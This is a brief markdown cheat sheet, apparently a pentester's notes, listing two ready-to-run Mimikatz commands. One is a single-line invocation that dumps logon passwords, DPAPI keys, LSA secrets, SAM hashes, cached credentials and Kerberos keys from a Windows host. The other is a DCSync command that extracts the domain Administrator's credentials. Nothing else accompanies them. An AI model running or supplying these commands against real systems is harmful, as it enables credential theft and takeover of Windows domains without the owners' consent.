# Mimikatz


## Oneline

```
mimikatz.exe "privilege::debug" "sekurlsa::dpapi" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

## DCSync

```
lsadump::dcsync /user:sub\Administrator /domain:sub.manesec.com
```